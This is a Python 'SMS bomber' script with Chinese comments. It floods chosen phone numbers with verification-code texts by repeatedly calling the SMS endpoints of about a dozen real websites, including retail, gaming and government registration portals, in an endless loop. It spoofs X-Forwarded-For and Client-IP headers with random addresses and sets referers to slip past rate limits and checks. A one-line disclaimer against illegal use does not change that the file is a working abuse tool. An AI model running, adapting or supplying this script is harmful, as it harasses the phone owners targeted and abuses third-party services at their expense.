#!/usr/bin/python
# -*- coding: utf-8 -*-
# 不可用于非法用途，使用本程序所产生的后果，与本人概不相关。

import requests
import re
import threading
import os
import random
import socket
import struct
import time

#API接口初始化，按照手机号生成不同的网址
def initAPI(phone):
    # 短信接口API 请求间隔时间 备注 请求方式 请求参数 需要SESSION的先决请求URL以及Referer
    APIList = [
        ["https://login.ceconline.com/thirdPartLogin.do", 60, "世界经理人", "POST",
         {"mobileNumber": phone, "method": "getDynamicCode", "verifyType": "MOBILE_NUM_REG", "captcharType": "",
          "time": str(int(time.time() * 1000))}, ""],

        ["http://www.ntjxj.com/InternetWeb/SendYzmServlet", 120, "机动车手机绑定", "POST", {"sjhm": phone},
         "http://www.ntjxj.com/InternetWeb/regHphmToTel.jsp"],

        ["https://www.itjuzi.com/api/verificationCodes", 60, "IT橘子", "POST", {"account": phone}, ""],

        ["http://yifatong.com/Customers/gettcode", 60, "易法通", "GET",
         {"rnd": ("%0.3f" % (time.time())), "mobile": phone},
         "http://yifatong.com/Customers/registration?url="],

        ["http://qydj.scjg.tj.gov.cn/reportOnlineService/login_login", 60, "天津企业登记", "POST",
         {'MOBILENO': phone, 'TEMP': 1},
         ""],

        ["http://www.shijiebang.com/a/mobile/vcode/", 120, "世界邦", "GET", {'key': phone},
         "http://www.shijiebang.com/reg/"],

        [
            "http://reg.ztgame.com/common/sendmpcode?source=giant_site&nonce=&type=verifycode&token=&refurl=&cururl=http://reg.ztgame.com/&mpcode=&pwd=&tname=&idcard=",
            60, "巨人网络", "GET", {'phone': phone}, "http://reg.ztgame.com/"],

        ["http://www.homekoo.com/zhixiao/zt_baoming_ajax_pc_new.php", 180, "尚品宅配", "POST",
         {"action": "OK", "username": "吕布", "tel": phone, "qq": "", "province": "", "city": "", "kehu_tel_time": "",
          "tg_id": "296", "sp_type": "986", "num_id": "5",
          "zhuanti_pages": "http://www.homekoo.com/zhixiao/cuxiao/index.php", "prevurl": ""},
         "http://www.homekoo.com/zhixiao/cuxiao/index.php"],

        ["http://jrh.financeun.com/Login/sendMessageCode3.html", 60, "金融号", "GET", {"mobile": phone, "mbid": "197858"},
         "http://jrh.financeun.com/Login/jrwLogin?web=jrw"],

        ["https://www.decathlon.com.cn/zh/ajax/rest/model/atg/userprofiling/ProfileActor/send-mobile-verification-code",
         30,
         "迪卡侬", "POST", {"countryCode": "CN", "mobile": phone}, "https://www.decathlon.com.cn/zh/create"],

        ["http://cta613.org/sendsms.php", 60, "支教", "POST", {"y": "1", "sj": phone}, ""],

        ["http://sns.qnzs.youth.cn/ajax/passportSendSms", 120, "青年之声", "POST", {"mobile": phone},
         "http://sns.qnzs.youth.cn/user/passport"]
    ]
    return APIList

# 短信初始化
class initSMS(object):
    """docstring for initSMS"""

    def __init__(self):
        super(initSMS, self).__init__()
        self.SMSList = []
        self.intervalInfo = 0

    def initBomb(self,APIList):
        for x in APIList:
            self.intervalInfo += 1
            self.SMSList.append(SMSObject(x[0], x[1], x[2], x[3], x[4], x[5], self.intervalInfo))
        return self.SMSList


class SMSObject(object):
    """docstring for SMSObject"""  # __var 私有成员变量

    def __init__(self, url, interval, info, method, params, others, intervalInfo):
        super(SMSObject, self).__init__()
        self.__url = url
        self.__interval = interval
        self.__info = info
        self.__intervalInfo = intervalInfo
        self.__method = method
        self.__params = params
        self.__others = others

    def getUrl(self):
        return self.__url

    def getInfo(self):
        return self.__info

    def getParams(self):
        return self.__params

    def getMethod(self):
        return self.__method

    def getOthers(self):
        return self.__others

    def getInterval(self):
        return self.__interval

    def getintervalInfo(self):
        return self.__intervalInfo

    def setintervalInfo(self, intervalInfo):
        self.__intervalInfo = intervalInfo


class Bomb(object):
    """docstring for Bomb"""

    def __init__(self):
        super(Bomb, self).__init__()
        self.HEADERS = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.81 Safari/537.36',
            'Referer': 'http://10.13.0.1',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'zh-CN,zh-TW;q=0.8,zh;q=0.6,en;q=0.4,ja;q=0.2',
            'cache-control': 'max-age=0',
            "X-Requested-With": "XMLHttpRequest"
        }

    def send(self, SMS):
        # return "SUCCESS"
        IP = socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))
        self.HEADERS['X-FORWARDED-FOR'] = IP
        self.HEADERS['CLIENT-IP'] = IP
        try:
            session = requests.Session()
            if SMS.getOthers() != "":
                session.get(SMS.getOthers(), timeout=5, headers=self.HEADERS)
                self.HEADERS['Referer'] = SMS.getOthers()
            if SMS.getMethod() == "GET":
                req = session.get(SMS.getUrl(), params=SMS.getParams(), timeout=5, headers=self.HEADERS)
            else:
                req = session.post(SMS.getUrl(), data=SMS.getParams(), timeout=5, headers=self.HEADERS)
        # print(req.url)
        except Exception as e:
            return str(e)
        return "已发送"



if __name__ == '__main__':
    # 手机号列表，如 ["12345678987","98765432123"]
    phoneList=[]
    bombNum=1
    while True: # 死循环
        currTime=0
        print("\n第",bombNum,"次轰炸！！！","\n")
        bombNum+=1
        for phone in phoneList: #遍历每个手机号
            APIList=initAPI(phone) # API接口初始化
            print("\n电话：", phone)
            SMSList = initSMS().initBomb(APIList=APIList)
            switchOn = Bomb()
            i = 0
            currTime = 0
            while True:
                currTime += 1
                # print(currTime)
                for x in SMSList:
                    if x.getintervalInfo() == 0:
                        i += 1
                        info = switchOn.send(x)
                        print(str(i) + "." + x.getInfo() + " " + info)
                        x.setintervalInfo(x.getInterval())
                    else:
                        x.setintervalInfo(x.getintervalInfo() - 1)
                time.sleep(5) #设置两次轰炸的间隔时间，单位是秒
                if i==len(APIList):
                    break
